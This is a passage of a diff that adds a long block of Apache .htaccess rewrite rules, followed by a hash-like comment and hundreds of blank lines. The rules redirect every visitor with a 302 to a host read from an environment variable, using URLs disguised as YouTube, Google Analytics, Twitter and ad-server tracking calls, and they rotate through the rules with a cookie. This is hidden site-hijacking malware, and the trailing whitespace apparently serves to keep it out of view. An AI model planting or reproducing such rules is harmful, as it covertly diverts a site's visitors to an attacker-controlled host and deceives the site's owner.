http://%{ENV:ngk}/s?hbt=114.245&tspfdt=594&len=522&decoding=software&ad_event=3&tsphab=1&hbd=4275511&ad_flags=0&nsivbblmean=237679.788&sd=B6F5EF809HH1342244445961017&cid=18&fmt=34&md=1&h=360&docid=7NZ9X9A2efA&rtl=1&q=Top\%20Gear\%20Jeremy\%20Clarkson\%20Aventador\%20J&eurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&volume=100&bd=1952928&plid=AATEw6LxgAzita6p&bt=40.149&tpmt=450&allowed=1_2,1_1,1_3,2_1,2_2_2,2_2,2_3&cfps=0&screenw=1280&nsivbblmin=20.000&screenh=720&sourceid=ys&art=3.015&autoplay=1&nbe=2&playerh=390&mt=0&el=profilepage&scoville=1&playerw=640&pd=15.537&fexp=920704,912706,921602,919804,913542,907335,922600,903114,924700,906510,906831,907344,907217,919306,920706,919316,902518,919324,924402,924500,915101&mos=0&slots=sst~0;sidx~0;at~2_3&nsiabblmin=1181.000&fs=0&at=2_3&ptk=bbcworldwide&w=640&sw=1.0&sst=0&sidx=0&rt=1846.878&nsivbblc=259&vid=tyyZmhZQhpi1re4lfPAwnGOgRj3x4qRnC&nsiabblmean=16793.050&nsiabblmax=34794.000&vq=auto&nsidf=6&st=438&vw=640&rendering=software&vh=360&hl=en_US&ns=yt&nsivbblmax=480659.000&et=454.44&bc=54203514&nsiabblc=259&tspne=0&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11049:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 29
+RewriteRule ^.* http://%{ENV:ngk}/botd.gif?blog=2441444&post=0&lang=en&date=1262001649&ip=118.209.33.47&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11337:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 30
+RewriteRule ^.* http://%{ENV:ngk}/s?el=detailpage&hbd=4303391&h=641&fmt=5&len=2996.44&volume=100&sd=BADC23143MH1341216405820433&md=1&csipt=watch5&docid=KQu39OO60As&q=\%E8\%88\%8C\%E5\%B0\%96\%E4\%B8\%8A\%E7\%9A\%84\%E4\%B8\%AD\%E5\%9B\%BD4&sourceid=ys&bt=39.805&hasstoryboard=1&bd=1800000&nsivbblmax=200771.000&tpmt=580&nsivbblmin=77058.000&w=854&cfps=25.041736227045075&nsivbblmean=127948.995&vtmp=1&screenw=1024&hl=en_US&screenh=768&ptk=youtube_multi&nsiabblmax=16379.000&fexp=919104,901601,921602,924700,913542,907335,922600,919306,919324,907344,907217,920706,919316,910006,920704,924500,912706,902518&playerh=640&scoville=1&nsiabblmin=16168.000&playerw=854&vq=small&nsivbblc=206&nsiabblmean=16372.286&fs=1&mos=0&nsiabblc=206&sendtmp=1&rt=595.019&vid=XnLoXTXgEZEZMARZ1_8tsJTlf6TKCAOPC&plid=AATD1EXw9ENr2xN4&lact=483275&et=1249.757&cr=ID&ahoffset=30&vw=320&rendering=software&vh=240&decoding=software&st=1209.554&nsidf=2&bc=25784675&ns=yt&hbt=130.762&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9759:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 31
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1342401351285&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_2&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Selama\%20Dua\%20Tahun\%20Pemerintahan\%20SBY\%20Rugikan\%20Negara\%20Rp\%2016\%2C4\%20T\%20-\%20Yahoo!\%20News\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=yahoo_id&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1334566952486375619454354  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9474:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 32
+RewriteRule ^.* http://%{ENV:ngk}/s?docid=4I_MsEB2mRk&len=46&ex_ads=3=1_1,1_3&nsiabblc=62&cid=2671599&nsiabblmean=20182.226&bd=687046&rmkt=1&bt=9.837&nsivbblmean=71788.855&nsiabblmin=778.000&tpmt=6&w=560&fbe=1&eurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&nsiabblmax=42680.000&vtmp=1&screenw=1280&slots=sst~0;sidx~0;at~2_3&nbe=1&playerw=560&nsivbblc=62&mt=0&playerh=315&hl=en_US&scoville=1&cfps=3.8323353293413174&pd=3.175&mos=0&screenh=720&fexp=920704,912706,921602,919324,924500,913542,907335,922600,903114,906510,907344,907217,919306,920706,919316,902518,924700,915101&allowed=2_1,2_3&el=embedded&fs=0&iframe=1&sidx=0&vid=tyyZmhZQhpi1re4lfPAwnGOgRj3x4qRnC&rt=14.621&et=6.85&ptk=Perform&at=2_3&st=0&art=1.688&framer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&volume=240.99055239353933&vw=640&plid=AATEIkz7jpJE7DiJ&vh=360&decoding=software&bc=1048149&ns=yt&rendering=software&tsphab=1&tspne=0&sst=0&vq=auto&tspfdt=454&ad_flags=0&h=315&hbt=131.738&ahoffset=27&sd=B6F5EF809HH1341551507059891&hbd=4276817&nsivbblmin=24.000&nsivbblmax=147768.000&sendtmp=1&fmt=34&md=1&ad_event=3  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10404:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 33
+RewriteRule ^.* http://%{ENV:ngk}/ja/a/hb/i/sg/adv/infinity/infinity_local_backfill_reordered_favicon.html?rnd=353437&ysm_rd=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_cm=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_ss=&ysm_ss_tag=&ysm_hs=&ysm_max_ads=6&ysm_ads_per_page=3&ysm_scroll_delay=10000&ysm_landing_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_width=300&ysm_height=250&ysm_css=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_backup_gif=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_mkt=id  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9081:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 34
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=461&campaignid=170&zoneid=155&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=548c795e1f  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11453:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 35
+RewriteRule ^.* http://%{ENV:ngk}/s?nsiabblmin=15958.000&nsiabblmax=16379.000&nsivbblc=262&rt=324.226&plid=AATD1coVoQroEKqv&h=481&vid=XnLoXTXgEZEZMARZ1_8tsJTlf6TKCAOPC&volume=100&et=137.304&ahoffset=30&st=97.275&nsivbblmax=184754.000&rendering=software&lact=33994&nsidf=48&nsivbblmean=132365.496&vw=426&vh=240&nsivbblmin=84766.000&decoding=software&len=2523.867&bc=14378662&ns=yt&q=\%E6\%B5\%AE\%E6\%B2\%89&el=detailpage&sourceid=ys&hbd=268280384&hbt=71.101&hl=en_US&w=854&sd=BADC23141MH1341222900025091&fexp=919104,901601,921602,924700,913542,907335,922600,919306,919324,907344,907217,920706,919316,910006,920704,924500,912706,902518&docid=xcQUeM2r28s&ptk=youtube_none&vq=small&csipt=watch5&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&bd=1822528&bt=40.241&hasstoryboard=1&fmt=5&md=1&sendtmp=1&tpmt=72&cfps=27.573529411764707&vtmp=1&screenw=1024&screenh=768&nsiabblc=262&cr=ID&playerh=640&nsiabblmean=16350.347&scoville=1&playerw=854&mos=0&fs=1  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10169:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 36
+RewriteRule ^.* http://%{ENV:ngk}/pixel;r=1467115439;a=p-94WKwgUwZHlfo;fpan=0;fpa=P0-773805928-1340768708065;ns=1;ce=1;je=0;sr=1280x768x24;enc=n;dst=0;et=1340769191300;tzo=-420;ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11558:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 37
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=4271&campaignid=2451&zoneid=766&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=16003baf8d  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9527:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 38
+RewriteRule ^.* http://%{ENV:ngk}/imghover?iact=hm&ei=NdTrT6_5FoXWrQeX5Y3EBQ&q=gelas+kopi+starbucks&tbs=&page=2&tbnh=117&tbnw=163&start=18&ndsp=20&dur=3736&tbnid=Bdq5HO4Ske_COM:&hovh=180&hovw=240&vpx=439&vpy=164&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:12,s:18,i:166&vetl=ms  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10653:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 39
+RewriteRule ^.* http://%{ENV:ngk}/event.js?thread_slug=wooyoung8217s_fans_prepare_image_wrapped_bus_and_led_billboards_for_solo_debut&user_type=anon&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&active_switches=\%5B\%22olark_admin_addons\%22\%2C\%22digests:add\%22\%2C\%22discovery_on_user_activity\%22\%2C\%22use_rs_paginator_30m\%22\%2C\%22es_index_threads\%22\%2C\%22discovery_best_comment\%22\%2C\%22html_email\%22\%2C\%22phoenix_reputation\%22\%2C\%22firehose\%22\%2C\%22olark_admin_packages\%22\%2C\%22upload_media\%22\%2C\%22firehose_gnip_http\%22\%2C\%22transitional_sessions\%22\%2C\%22statsd_created\%22\%2C\%22bespin\%22\%2C\%22firehose_pubsub\%22\%2C\%22firehose_message_db_lookup\%22\%2C\%22limit_get_posts_days_30d\%22\%2C\%22shardvote\%22\%2C\%22juggler_thread_onReady\%22\%2C\%22discovery_network\%22\%2C\%22redis_sessions\%22\%2C\%22edits_to_spam\%22\%2C\%22embedapi\%22\%2C\%22shorten_notifications_links\%22\%2C\%22ssl\%22\%2C\%22website_2012_deploy\%22\%2C\%22shardpost:index\%22\%2C\%22usertransformer_reputation\%22\%2C\%22fingerprint\%22\%2C\%22send_to_impermium\%22\%2C\%22firehose_push\%22\%2C\%22shardpost\%22\%2C\%22ext_discovery_user\%22\%2C\%22train_impermium\%22\%2C\%22digests\%22\%2C\%22show_captcha_on_links\%22\%2C\%22website_base_template\%22\%2C\%22firehose_pubsub_throttle\%22\%2C\%22new_moderate\%22\%2C\%22use_rs_paginator_60m\%22\%2C\%22redis_threadcount\%22\%2C\%22shardvote:index\%22\%2C\%22listactivity_replies\%22\%2C\%22juggler_enabled\%22\%2C\%22next_thread_sharing\%22\%2C\%22use_master_for_api\%22\%2C\%22next_raven\%22\%2C\%22next_realtime:indicators\%22\%2C\%22moderate_ascending\%22\%2C\%22notifications:generate_msgid\%22\%2C\%22community_icon\%22\%2C\%22static_styles\%22\%2C\%22stats\%22\%2C\%22realtime\%22\%2C\%22redis_notification_tokens\%22\%2C\%22realtime_cached\%22\%2C\%22olark_support\%22\%2C\%22firehose_gnip\%22\%2C\%22discovery_on_content\%22\%2C\%22digests:process\%22\%2C\%22olark_addons\%22\%2C\%22phoenix_optout\%22\%2C\%22use_impermium\%22\%2C\%22shardvote:api\%22\%2C\%22phoenix\%22\%2C\%22discovery_redirect_event\%22\%2C\%22new_thread_create\%22\%2C\%22autocommitted_thread\%22\%2C\%22theme_editor_disabled\%22\%2C\%22shardvote:backfills\%22\%2C\%22next_realtime\%22\%2C\%22notifications\%22\%2C\%22listactivity_replies_30d\%22\%2C\%22ext_discovery_content\%22\%2C\%22statsd.timings\%22\%2C\%22git_themes\%22\%2C\%22google_analytics\%22\%2C\%22mentions\%22\%2C\%22olark_install\%22\%5D&theme=allkpop\%202011&prev_imp=1341634281928790463&event=init_embed&thread=753649271&forum=allkpop&forum_id=572511&imp=1341634281928790463  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11514:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 40
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.3&utms=1&utmn=92316740&utmhn=mrdian.blogspot.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1008x638&utmsc=16-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=Sinopsis\%20BIG\%20Episode\%20Lengkap\%201\%20-\%2016\%20Episode\%20Terakhir&utmhid=376656866&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/2012/07/sinopsis-big-episode-1-16-episode.html&utmac=UA-31894026-1&utmcc=__utma\%3D192133238.1256396737.1342245476.1342245476.1342245476.1\%3B\%2B__utmz\%3D192133238.1342245476.1.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dsinopsis\%2520big\%3B&utmu=q~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11122:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 41
+RewriteRule ^.* http://%{ENV:ngk}/url?sa=t&rct=j&q=majesty+hotel+bandung&source=web&cd=1&ved=0CGUQFjAA&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=Rn3yT6udCpDyrQeqjfHjBg&usg=AFQjCNFNOkb5MMr5QZzQvaK5f3iLcY0nkA  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11874:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 42
+RewriteRule ^.* http://%{ENV:ngk}/b?c1=2&c2=8443234&ns__t=1341191472655&ns_c=UTF-8&c8=detikcom\%20:\%20situs\%20warta\%20era\%20digital&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11574:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 43
+RewriteRule ^.* http://%{ENV:ngk}/hb/i/sg/adv/infinity/sg_prom_ysm_iframe_20110425.html?ysm_rd=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_title1=Liburan\%20Murah&ysm_descr1=Bandingkan\%20harga\%20pesawat\%20dan\%20hotel&ysm_clickurl1=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_sitehost1=&ysm_pos=2&ord=1340616298080293  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10758:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 44
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1340073113240&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&size=m&text=Berapa\%20Gaji\%20Pemadam\%20Kebakaran\%3F&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=detikcom&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1334561823992562238014683  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11597:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 45
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.2&utms=2&utmn=2137512796&utmhn=carapedia.com&utmcs=ISO-8859-1&utmsr=800x600&utmvp=783x444&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmdt=Pengertian\%20dan\%20Definisi\%20Filsafat\%20-\%20Definisi\%20-\%20CARApedia&utmhid=1446280263&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/pengertian_definisi_filsafat_info2076.html&utmac=UA-29486227-1&utmcc=__utma\%3D89216009.291205537.1340933736.1340933736.1340933736.1\%3B\%2B__utmz\%3D89216009.1340933736.1.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dgambar-gambar\%2520para\%2520filsuf\%3B&utmu=q~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11903:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 46
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=4274&campaignid=2451&zoneid=769&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=96cd52ca33  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11470:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 47
+RewriteRule ^.* http://%{ENV:ngk}/1pix.gif?dcsdat=1340350598562&dcssip=&os=Windows\%20XP&lang=en&flashVer=WIN\%2010\%2C1\%2C102\%2C64&dcsref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&playerURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&videoId=1501416059001&dcsuri=/viewer/media_connect_error&playerId=1522730664001&mediaURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&publisherId=89804535001&errorCode=NetStream.Play.StreamNotFound&affiliateId=&sourceId=89804535001&lineupId=1521712908001&playerTag=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11988:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 48
+RewriteRule ^.* http://%{ENV:ngk}/delivery/ajs.php?zoneid=1&target=_blank&block=1&cb=16251261402&charset=UTF-8&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11347:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 49
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.3&utms=1&utmn=514475735&utmhn=hot.detik.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1007x628&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r42&utmdt=detikHot\%20:\%20hiburan\%20digital\%20anda&utmhid=1655693230&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/movie/\%3F9922032&utmac=UA-891770-8&utmcc=__utma\%3D1.60131793.1334705912.1341214202.1341222323.92\%3B\%2B__utmz\%3D1.1341222323.92.90.utmcsr\%3Ddetik.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/\%3B&utmu=qhAAAAAg~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9790:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 50
+RewriteRule ^.* http://%{ENV:ngk}/ttj?id=775193&size=160x600&pfm=1&tlfs=ch&tphv=ch&rtg=pg&brw=ff3&os=wxp&prm=0&efo=0&dir=0&pas=0&position=above&uatRandNo=84527&ad_type=ad&section=2876798&ad_size=160x600&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&nsafe=general&reftype=none&disp=none&pub_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=1857783313&ck=1&c=72&q=noap&q=cre&q=noad&q=noba&s=o&s=tb&s=911&s=d&s=g&s=m&s=p&s=t&s=al&s=nn  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10844:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 51
+RewriteRule ^.* http://%{ENV:ngk}/pixel;r=2294475;a=p-94WKwgUwZHlfo;fpan=0;fpa=P0-695296549-1342159017258;ns=1;ce=1;je=0;sr=1024x768x16;enc=n;dst=0;et=1342159088201;tzo=-420;ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11803:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 52
+RewriteRule ^.* http://%{ENV:ngk}/aid/3510974010282619264/bc.pv?blur=false&poll=30000&pve=3405898318776297844&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pvid=3405898453877854757&idid=6935615931309997668&cp=http&cwidth=640&cheight=480&pwidth=480&pheight=360&cwdid=2592266234922395213&1340589845137&_bcvm_vid_3510974010282619264=3405897462122066761&_bcvm_vrid_3510974010282619264=3405897464592121160&undefined  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9118:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 53
+RewriteRule ^.* http://%{ENV:ngk}/www/delivery/ajs.php?zoneid=33&cb=10457512977&charset=UTF-8&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11626:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 54
+RewriteRule ^.* http://%{ENV:ngk}/api/getCount2.php?cb=stButtons.processCB&refDomain=www.mangahere.com&refQuery=manga/shuukatsu_kimi_ni_naitei/v02/c006//&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=e47efe7d-147b-4731-ac42-9838ccdc52f2&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11876:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 55
+RewriteRule ^.* http://%{ENV:ngk}/lg.php?bannerid=610&campaignid=263&zoneid=2&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=141981f811  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11842:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 56
+RewriteRule ^.* http://%{ENV:ngk}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-5914&sessionID=1340778410257.43719&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/do_not_fight/c001/24.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.4lx0t0Lu&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/do_not_fight/c001/23.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Do\%20Not\%20Fight\%201\%20-\%20Read\%20Do\%20Not\%20Fight\%20Chapter\%201\%20Online\%20-\%20Page\%2024&ts1340778410259.0=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9953:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 57
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1340104515410&count=horizontal&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&size=m&text=Felt\%20Flowers\%20and\%20Metal\%20Pails\%20for\%20Kids\%20-\%20Bouquet\%20(Pastel)&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334715939294356669263023  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11374:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 58
+RewriteRule ^.* http://%{ENV:ngk}/statapi/stat/add?jsoncallback=jsonp1341300609605&_=1341300612159&app_id=4fc5e9ab10c7025204000000&article_id=842375&title=Inilah\%2520Alasan\%2520Katie\%2520Gugat\%2520Cerai\%2520Cruise\%2520-\%2520KOMPAS.com&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ip=202.137.23.104&browser=Mozilla&version=5.0+(Windows\%3B+en-US)&platform=Windows+NT+5.1&user_agent=Mozilla/5.0+(Windows\%3B+U\%3B+Windows+NT+5.1\%3B+en-US\%3B+rv:1.9.1)+Gecko/20090624+Firefox/3.5  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11919:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 59
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1342349823632&count=none&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_18&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Foto\%20Julia\%20Perez\%20Tampil\%20Sopan\%20di\%20Kolam\%20Renang\%20\%7C\%20Gambar\%20Julia\%20Perez\%20Tampil\%20Sopan\%20di\%20Kolam\%20Renang\%20-\%20Yahoo!\%20OMG!\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1342348403713224765832421  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9129:/:0:HttpOnly]
+
+</IfModule>
+#6d1da4977c4589b926c54864babf1b6a36f4e8145f95a2a70294e524
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
